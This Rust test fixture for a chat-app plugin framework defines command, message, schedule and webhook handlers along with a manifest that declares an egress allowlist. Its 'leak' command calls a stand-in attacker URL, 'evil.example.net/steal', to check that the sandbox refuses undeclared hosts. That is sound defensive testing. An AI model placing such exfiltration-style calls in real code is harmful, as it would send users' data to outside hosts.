//! Every handler and host function, for the CLI's tests: the Rust twin of the
//! `kitchen-sink` fixture.

use pollis_app::{
    bail, Action, Command, CommandSpec, Context, EventKind, FetchInit, Manifest, Message,
    MessageQuery, Schedule, ScheduleSpec, Webhook,
};
use serde_json::{json, Value};

fn on_command(cmd: Command, ctx: &Context) -> pollis_app::Result {
    match cmd.name.as_str() {
        "count" => {
            let n = ctx.state.get_json::<u64>("count")?.unwrap_or(0) + 1;
            ctx.state.set_json("count", &n)?;
            ctx.reply(&cmd.message, format!("count is {n}"))
        }
        "ticket" => {
            let init = FetchInit::new()
                .method("post")
                .json(&json!({ "title": cmd.args }))?;
            let res = ctx.fetch("https://api.example.com/tickets", init)?;
            let body: Value = res.json()?;
            let kind = res.headers.get("x-kind").unwrap_or_default();
            let id = body["id"].as_str().unwrap_or_default();
            ctx.reply(&cmd.message, format!("Filed {id} ({}, {kind})", res.status))
        }
        "leak" => match ctx.fetch("https://evil.example.net/steal", FetchInit::new()) {
            Err(e) if e.is_refused() => ctx.reply(&cmd.message, format!("refused: {e}")),
            Err(e) => ctx.reply(&cmd.message, format!("other: {e}")),
            Ok(_) => ctx.reply(&cmd.message, "reached it"),
        },
        "edit" => {
            // Not in `actions`: the refusal fails the handler, and nothing is sent.
            ctx.reply(&cmd.message, "this reply is discarded")?;
            ctx.edit_own(&cmd.message, "nope")
        }
        "history" => {
            let query = MessageQuery {
                limit: Some(10),
                ..MessageQuery::default()
            };
            let found: Vec<String> = ctx.messages(query)?.into_iter().map(|m| m.text).collect();
            ctx.reply(&cmd.message, found.join(" | "))
        }
        "random" => {
            ctx.log.info(format!("random {}", ctx.random()));
            println!("hello from println");
            ctx.react(&cmd.message, "🎲")
        }
        "throw" => bail!("something broke"),
        "panic" => panic!("something panicked"),
        name => ctx.post(&cmd.message.channel, format!("unknown command {name}")),
    }
}

fn on_message(message: Message, ctx: &Context) -> pollis_app::Result {
    if message.text.contains("help") {
        ctx.reply(&message, "Try /ticket")?;
    }
    Ok(())
}

fn on_schedule(schedule: Schedule, ctx: &Context) -> pollis_app::Result {
    ctx.log
        .info(format!("schedule {} at {} now {}", schedule.name, schedule.slot, ctx.now()));
    Ok(())
}

fn on_webhook(webhook: Webhook, ctx: &Context) -> pollis_app::Result {
    ctx.log
        .info(format!("webhook {}", webhook.header("Content-Type").unwrap_or("none")));
    let event: Value = webhook.json()?;
    let channel = event["channel"].as_str().unwrap_or_default();
    ctx.post(channel, event["text"].as_str().unwrap_or_default())
}

pollis_app::app! {
    manifest: Manifest::new()
        .channels(["#support"])
        .history(7)
        .events([EventKind::Created, EventKind::Edited])
        .actions([Action::Post, Action::Reply, Action::React])
        .state_quota(1024)
        .egress(["api.example.com"])
        .command(CommandSpec::new("count", "Count up"))
        .command(CommandSpec::new("ticket", "File a ticket").arg_hint("<title>"))
        .command(CommandSpec::new("leak", "Try an undeclared host"))
        .command(CommandSpec::new("edit", "Try an undeclared action"))
        .command(CommandSpec::new("history", "Read history"))
        .command(CommandSpec::new("random", "Roll"))
        .command(CommandSpec::new("throw", "Fail"))
        .command(CommandSpec::new("panic", "Fail harder"))
        .command(CommandSpec::new("other", "Falls through"))
        .schedule(ScheduleSpec::new("daily", 86400).offset(32400)),
    on_command: on_command,
    on_message: on_message,
    on_mention: |message, ctx| ctx.reply(&message, "you rang"),
    on_schedule: on_schedule,
    on_webhook: on_webhook,
}
